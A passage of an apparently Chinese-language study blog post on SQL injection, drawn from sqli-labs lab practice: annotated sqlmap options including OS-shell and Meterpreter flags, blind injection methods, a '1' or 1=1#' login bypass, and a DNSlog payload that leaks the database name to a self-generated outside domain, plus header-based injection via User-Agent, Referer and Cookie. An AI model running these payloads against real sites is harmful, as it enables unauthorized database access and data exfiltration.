+--columns           Enumerate DBMS database table columns
+                    枚举DBMS数据库表列
+--schema            Enumerate DBMS schema
+                    枚举DBMS模式
+--dump              Dump DBMS database table entries
+                    转储DBMS数据库表条目
+--dump-all          Dump all DBMS databases tables entries
+                    转储所有DBMS数据库表条目
+-D DB               DBMS database to enumerate
+                    要枚举的DBMS数据库
+-T TBL              DBMS database table(s) to enumerate
+                    要枚举的DBMS数据库表
+-C COL              DBMS database table column(s) to enumerate
+                    要枚举的DBMS数据库表列
+</code></pre>
+<p>  Operating system access:<br>    These options can be used to access the back-end database management<br>    system underlying operating system<br>    操作系统访问：<br>      这些选项可用于访问后端数据库管理系统的底层操作系统</p>
+<pre><code>--os-shell          Prompt for an interactive operating system shell
+                    提示输入交互式操作系统shell
+--os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+                    提示输入OOB shell、Meterpreter或VNC
+</code></pre>
+<p>  General:<br>    These options can be used to set some general working parameters<br>    通用：<br>      这些选项可用于设置一些通用的工作参数</p>
+<pre><code>--batch             Never ask for user input, use the default behavior
+                    永不询问用户输入，使用默认行为
+--flush-session     Flush session files for current target
+                    清除当前目标的会话文件
+</code></pre>
+<p>  Miscellaneous:<br>    These options do not fit into any other category<br>    其他：<br>      这些选项不属于任何其他类别</p>
+<pre><code>--wizard            Simple wizard interface for beginner users
+                    为初学者提供简单的向导界面
+</code></pre>
+<p>[!] to see full list of options run with ‘-hh’<br>[!] 要查看完整选项列表，请使用’-hh’运行</p>
+<p>原理：用ASCII码来判断，就是用每个字母所代表的ASCII码来依次尝试，如果页面显示了正确，就可以用这个来确定每个字母是什么再通过拼接来找到目标<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721645426707-15bd8f25-55d2-449d-9ab2-4f14b5aef465.png#averageHue=%23e9e9e7&clientId=u9d620b1f-fd24-4&from=paste&height=303&id=u5ccbbb7f&originHeight=379&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=172237&status=done&style=none&taskId=u990145fc-f8e0-41be-961b-7c2ba81ca30&title=&width=934.4" alt="屏幕截图 2024-07-22 184640.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721645435826-f7074d3b-4d26-4b04-b69c-cb501303813a.png#averageHue=%23edf0f0&clientId=u9d620b1f-fd24-4&from=paste&height=348&id=uf1034ddd&originHeight=435&originWidth=524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270809&status=done&style=none&taskId=uf3df3c43-b880-49f4-96e6-a25560135b0&title=&width=419.2" alt="屏幕截图 2024-07-22 184659.png"><br>分类：布尔盲注，时间盲注，报错盲注</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721645439636-a06a5c93-c92d-4541-a927-9b6dd865a74e.png#averageHue=%23d9e1a8&clientId=u9d620b1f-fd24-4&from=paste&height=371&id=u46b9a51c&originHeight=464&originWidth=1324&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228739&status=done&style=none&taskId=u9ae51b8d-c588-4521-bb7f-e4dfdb18853&title=&width=1059.2" alt="屏幕截图 2024-07-22 184754.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721645447777-65bea17b-c790-4aa1-982c-88cbb3c57006.png#averageHue=%23e5e8c8&clientId=u9d620b1f-fd24-4&from=paste&height=552&id=u05f7462a&originHeight=690&originWidth=1388&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=478902&status=done&style=none&taskId=ue571ee9c-4947-4ef0-bdb9-8c998cb4ba0&title=&width=1110.4" alt="屏幕截图 2024-07-22 184822.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721650828540-6c9d397c-7340-4ffe-8f0c-8af4b0c4d99d.png#averageHue=%234e4f43&clientId=u47a05137-4074-4&from=paste&height=403&id=ufc0b5fa1&originHeight=504&originWidth=1524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=286656&status=done&style=none&taskId=u07208222-c680-4c70-b69b-3fee4f6be98&title=&width=1219.2" alt="image.png"><br>用and不用union</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>sleep（）括号里面代表这个网站加载多少秒<br>相比布尔盲注多了一个if判断，通过判断第一个条件是否成立，如果成立就执行第一个条件sleep（0）<br>如果不成立就执行第二个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721650945160-27e425f0-6e22-482c-b35f-4de4aaad3bd9.png#averageHue=%23d9dbc5&clientId=u47a05137-4074-4&from=paste&height=514&id=ua31354ef&originHeight=643&originWidth=1738&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=482371&status=done&style=none&taskId=u13613274-ad53-4ee5-aea6-c3a45a322b3&title=&width=1390.4" alt="屏幕截图 2024-07-22 200818.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721651164658-e4d641b9-fbb9-4379-bcad-928261003cef.png#averageHue=%23f9f9f9&clientId=u7ef59351-f90d-4&from=paste&height=430&id=uc091138b&originHeight=537&originWidth=813&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106879&status=done&style=none&taskId=u99c6a0a1-5bd2-4428-af07-812ea85812b&title=&width=650.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721733953989-8e6e7cbf-8833-4742-84c1-8f8fa8a4d9ba.png#averageHue=%2390953c&clientId=ue3b5241b-02c1-4&from=paste&height=694&id=uaab97e51&originHeight=867&originWidth=1605&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=313022&status=done&style=none&taskId=udf8d7d24-6e71-4a2a-b58c-9337d22a418&title=&width=1284" alt="image.png"></p>
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>1’ or 1&#x3D;1#</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>outfile<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721822421347-33cd301e-a75c-4bf8-8c0d-3e1114f653b7.png#averageHue=%23fafafa&clientId=ue246abde-c26c-4&from=paste&height=399&id=u8cf774f1&originHeight=499&originWidth=1548&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=325220&status=done&style=none&taskId=u674ad067-842a-4392-a519-e9fb8102c1d&title=&width=1238.4" alt="屏幕截图 2024-07-24 195956.png"></p>
+<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>(手动)<br>先打开yakit找到反连DNS然后生成可用域名<br>然后去注入点输入指令<br>这里用第九关的来演示   ?id&#x3D;1’ and (select load_file(concat(“&#x2F;&#x2F;“,(select database),”自己生成的域名”)))–+<br>注意：在域名前要加点，这样才能和前面的sql语句连接起来<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721874560645-58a454d5-db5b-492f-a794-ba6ce4e27c50.png#averageHue=%23987256&clientId=u446d4f1e-38d5-4&from=paste&height=628&id=ub6f5f300&originHeight=785&originWidth=1561&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120564&status=done&style=none&taskId=u5ba3d1dd-75d6-436b-b076-bc4c960752f&title=&width=1248.8" alt="image.png"><br>因为这可以解析域名，所以在前面加上sql语句也可以</p>
+<h2 id="HTTP头uagent响应"><a href="#HTTP头uagent响应" class="headerlink" title="HTTP头uagent响应"></a>HTTP头uagent响应</h2><p>这里先是输入正确的用户和密码登录进去后，提示回显是在agent，所以可以用burp siute来抓包，通过对请求包的agent来注入，先要判断闭合方式因为这里是（’’,’’,’’）所以这里用  ‘,’’,’’)闭合整个语句，然后在‘ 这个后面加上注入语句，前面的部分相当于一个参数，就是下面这个蓝色字体的部分<img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721888859975-1d031e2d-4453-455c-ab73-c97260bd3b66.png#averageHue=%2394936b&clientId=u446d4f1e-38d5-4&from=paste&height=414&id=u2d3fd9a8&originHeight=517&originWidth=1492&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=195433&status=done&style=none&taskId=uf68e7312-e16a-45d9-9384-4683e646784&title=&width=1193.6" alt="image.png"><br>通过对源码的查看可以看见闭合方式<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721889616636-13441903-0149-4cae-a640-097be320a8cb.png#averageHue=%23232120&clientId=u446d4f1e-38d5-4&from=paste&height=74&id=uaeaa6d15&originHeight=93&originWidth=1291&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15647&status=done&style=none&taskId=u4b136c72-57e6-49b0-aba8-6bb3b9092aa&title=&width=1032.8" alt="image.png"><br>必须要在这个账号可以登录进去的情况下才可以抓包，因为这样才能知道传入的数据和后端进行了交互，通过拦截请求包，然后修改内容后放行就可以了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721888794980-00f37e98-869a-427a-8e06-f68d11b49584.png#averageHue=%238f8f8e&clientId=u446d4f1e-38d5-4&from=paste&height=332&id=u1f92f676&originHeight=415&originWidth=1861&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63089&status=done&style=none&taskId=u7b5cf516-e0ff-47e1-985b-5f39b2f94e8&title=&width=1488.8" alt="image.png"></p>
+<h2 id="HTTP头referer"><a href="#HTTP头referer" class="headerlink" title="HTTP头referer"></a>HTTP头referer</h2><p>方法和上面的agent差不多，下面这个例子就是闭合方式和上面不一样<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721917355990-d9f0ccd7-ab9b-4ae4-b35a-624532f8d1c1.png#averageHue=%23242423&clientId=ufc5d0d0e-cb28-4&from=paste&height=394&id=ud063f46d&originHeight=492&originWidth=1301&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39410&status=done&style=none&taskId=ua2619133-ba68-4b4b-8b98-619fd176c33&title=&width=1040.8" alt="屏幕截图 2024-07-25 215035.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721917330735-3825e99d-bcfe-4540-96a9-c202d6aa7215.png#averageHue=%23a6a74b&clientId=ufc5d0d0e-cb28-4&from=paste&height=202&id=uee80f9f5&originHeight=252&originWidth=1490&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=199967&status=done&style=none&taskId=u3e4a9164-5fa3-4f72-9215-5735d5da9b7&title=&width=1192" alt="屏幕截图 2024-07-25 215526.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721917340480-2a42d446-dc8d-4248-8000-faf00ac5f451.png#averageHue=%23949467&clientId=ufc5d0d0e-cb28-4&from=paste&height=218&id=u0eb91962&originHeight=273&originWidth=1504&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207020&status=done&style=none&taskId=ud8e192a8-753f-421c-aca8-13352194bd9&title=&width=1203.2" alt="屏幕截图 2024-07-25 215330.png"></p>
+<h2 id="HTTP头cookie"><a href="#HTTP头cookie" class="headerlink" title="HTTP头cookie"></a>HTTP头cookie</h2><p>cookie相当于一个保存密码的东西，就是输入完用户名和密码之后可以不需要再次输入就可以登录进去<br>cookie的话要先登录进界面，然后通过刷新界面来抓包修改请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721917485994-9743f2be-19fb-411b-826d-6cad6ea7427b.png#averageHue=%2385817d&clientId=ufc5d0d0e-cb28-4&from=paste&height=189&id=uba0d94fe&originHeight=236&originWidth=1493&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61206&status=done&style=none&taskId=ud27f8a7c-cfa7-45bc-9771-d1ae7b69085&title=&width=1194.4" alt="屏幕截图 2024-07-25 220926.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721917494929-ab90a82a-343e-4e14-b2a2-c4091ad94e7e.png#averageHue=%23888682&clientId=ufc5d0d0e-cb28-4&from=paste&height=211&id=uc4521c2e&originHeight=264&originWidth=1546&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71124&status=done&style=none&taskId=ua7dfcd51-988f-426c-914f-c95f7b11191&title=&width=1236.8" alt="屏幕截图 2024-07-25 221013.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Lccc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/07/sql%E6%B3%A8%E5%85%A5/">http://example.com/2024/08/07/sql%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">lccc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://static.iamxk.com/wp-content/uploads/2019/09/0eadd4bb-dd0f-402a-9e3e-a5afc3b81cd0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/07/sqli%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://static.iamxk.com/wp-content/uploads/2019/09/0eadd4bb-dd0f-402a-9e3e-a5afc3b81cd0.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Lccc</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">增删改语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">查询语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#union"><span class="toc-number">1.2.1.</span> <span class="toc-text">union</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#group-by"><span class="toc-number">1.2.2.</span> <span class="toc-text">group by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by-limit"><span class="toc-number">1.2.3.</span> <span class="toc-text">order by     ,        limit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.4.</span> <span class="toc-text">注入顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">先找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%EF%BC%88%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E4%B8%8D%E9%9C%80%E8%A6%81%E9%97%AD%E5%90%88%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">再判断闭合方式（字符型，数字型不需要闭合）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0%E7%9A%84%E9%95%BF%E7%9F%AD"><span class="toc-number">1.4.3.</span> <span class="toc-text">判断查询列数的长短</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.4.</span> <span class="toc-text">查询回显位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.5.1.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">1.5.2.</span> <span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">1.5.3.</span> <span class="toc-text">floor()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rand-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">rand()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#concat-ws-1%EF%BC%8C2%EF%BC%8C3-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">concat_ws(1，2，3)函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#as%E5%88%AB%E5%90%8D%EF%BC%8Cgroup-by%E5%88%86%E7%BB%84"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">as别名，group by分组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#count-%E6%B1%87%E6%80%BB%E7%BB%9F%E8%AE%A1%E6%95%B0%E9%87%8F"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">count()汇总统计数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#floor-rand-0-2-%E7%94%A8%E6%9D%A5%E6%8A%A5%E9%94%99"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">floor(rand(0)*2)用来报错</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.6.1.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.3.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.8.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog"><span class="toc-number">1.9.</span> <span class="toc-text">DNSlog</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%A4%B4uagent%E5%93%8D%E5%BA%94"><span class="toc-number">2.</span> <span class="toc-text">HTTP头uagent响应</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%A4%B4referer"><span class="toc-number">3.</span> <span class="toc-text">HTTP头referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%A4%B4cookie"><span class="toc-number">4.</span> <span class="toc-text">HTTP头cookie</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/sql%E6%B3%A8%E5%85%A5/" title="无题">无题</a><time datetime="2024-08-07T11:59:31.723Z" title="发表于 2024-08-07 19:59:31">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/sqli%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="无题">无题</a><time datetime="2024-08-07T11:58:09.940Z" title="发表于 2024-08-07 19:58:09">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/03/python/" title="无题">无题</a><time datetime="2024-08-03T09:10:11.784Z" title="发表于 2024-08-03 17:10:11">2024-08-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/03/hello-world/" title="Hello World">Hello World</a><time datetime="2024-08-03T09:10:11.783Z" title="发表于 2024-08-03 17:10:11">2024-08-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Lccc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
